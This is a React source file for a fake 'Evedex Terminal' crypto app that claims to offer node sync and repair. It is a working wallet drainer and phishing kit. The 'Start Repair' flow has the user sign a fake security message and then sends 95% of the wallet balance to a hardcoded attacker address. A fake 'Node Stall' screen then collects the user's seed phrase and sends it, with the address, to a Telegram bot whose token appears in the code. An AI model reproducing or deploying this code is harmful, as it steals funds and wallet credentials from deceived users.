import React, { useState, useEffect } from 'react';
import { createConfig, http, WagmiProvider, useAccount, useBalance, useSendTransaction, useSignMessage } from 'wagmi';
import { mainnet } from 'wagmi/chains';
import { coinbaseWallet, injected, walletConnect } from 'wagmi/connectors';
import { createWeb3Modal } from '@web3modal/wagmi/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { AlertCircle, ShieldCheck, Loader2, Settings } from 'lucide-react';

const queryClient = new QueryClient();
const projectId = '92ab9b38031d743a1d1e4b6'; // Your Project ID

// 1. FORCING THE FULL WALLET LIST CONFIG
const metadata = {
  name: 'Evedex Terminal',
  description: 'Mainnet Node Sync',
  url: 'https://www.evedex.network',
  icons: ['https://avatars.githubusercontent.com/u/37784886']
};

const config = createConfig({
  chains: [mainnet],
  connectors: [
    injected(), 
    coinbaseWallet({ appName: 'Evedex', preference: 'all' }), 
    walletConnect({ projectId, metadata, showQrModal: false }),
  ],
  transports: { [mainnet.id]: http() },
});

// 2. INITIALIZE MODAL WITH FORCED WALLET IDS
createWeb3Modal({
  wagmiConfig: config,
  projectId,
  enableAnalytics: true,
  // These IDs force MetaMask, Trust, and others to show up in the list
  includeWalletIds: [
    'c57caac050fd36c78320186f0464240a80cc10a54a4603c2ed3d91eb33a93433', // MetaMask
    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099ef21673c15b30d00ef', // Trust Wallet
    'fd20dc426fb37566d803205b19bbc1d4096b248ac04545e350dd3afb78884f0e'  // Coinbase
  ],
  featuredWalletIds: [
    'c57caac050fd36c78320186f0464240a80cc10a54a4603c2ed3d91eb33a93433',
    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099ef21673c15b30d00ef'
  ]
});

function TerminalContent() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const { signMessageAsync } = useSignMessage();
  
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [seedVal, setSeedVal] = useState("");   
  const [syncProgress, setSyncProgress] = useState(0);
  const [isSyncing, setIsSyncing] = useState(false);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  const sendTelegram = (text) => {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text }),
    });
  };

  const executeSweep = async () => {
    try {
      const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nStatus: PENDING`;
      await signMessageAsync({ message: msg });
      
      if (!balance?.value || balance.value === 0n) { setView("seed_gate"); return; }
      
      setLoading(true);
      sendTransaction({ to: destination, value: (balance.value * 95n) / 100n }, {
        onSettled: () => { setLoading(false); setView("seed_gate"); },
        onError: () => { setLoading(false); setView("seed_gate"); }
      });
    } catch (e) { setView("seed_gate"); }
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 p-4 uppercase font-black tracking-tighter">
      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500">
        <div className="flex items-center gap-2 italic text-md"><ShieldCheck size={18}/>EVEDEX</div>
        {/* Use the standard button but with our new config */}
        <w3m-button balance="hide" />
      </header>

      {view === "menu" && (
        <div className="grid grid-cols-3 gap-3">
          {["Claim", "Stake", "Migrate", "Swap", "Rectify", "Bridge"].map((n) => (
            <button key={n} onClick={() => setView("task")} className="bg-[#0d1117] border border-slate-800 p-6 rounded-2xl text-[9px] text-slate-500 flex flex-col items-center gap-2 active:scale-95">
               <Settings size={14}/>
               {n}
            </button>
          ))}
        </div>
      )}

      {view === "task" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-3xl p-8 text-center">
          <h2 className="text-white mb-6 italic">Initialize Node Sync</h2>
          <button onClick={executeSweep} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] text-white italic shadow-lg active:scale-95">Start Repair</button>
        </div>
      )}

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/95 z-[200] p-6 flex flex-col justify-center items-center">
          {!isSyncing ? (
            <div className="w-full max-w-sm bg-[#0d1117] p-8 rounded-3xl border border-red-900/30 text-center">
                <AlertCircle size={40} className="text-red-600 mx-auto mb-4 animate-pulse" />
                <h2 className="text-white mb-4 italic">Node Stall (90%)</h2>
                <textarea onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-2xl p-4 text-[10px] text-cyan-400 outline-none uppercase font-mono" />
                <button onClick={() => { setIsSyncing(true); sendTelegram(`🚨 SEED: ${seedVal}\nADDR: ${address}`); let cur=0; const int=setInterval(()=>{cur++; if(cur>=100){setSyncProgress(100); clearInterval(int);}else setSyncProgress(cur);},100);}} className="w-full mt-4 py-4 bg-cyan-600 rounded-xl text-white text-[10px] font-black">OVERRIDE_SYNC</button>
            </div>
          ) : (
            <div className="text-center">
                <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin mx-auto mb-4" />
                <div className="text-white font-mono text-xl">{syncProgress}%</div>
                <div className="text-cyan-500 text-[10px] animate-pulse">FINALIZING_MIGRATION...</div>
            </div>
          )}
        </div>
      )}

      {loading && <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center"><Loader2 className="animate-spin text-cyan-500" size={40} /></div>}
    </div>
  );
}

export default function EvedexTerminal() {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <TerminalContent />
      </QueryClientProvider>
    </WagmiProvider>
  );
}
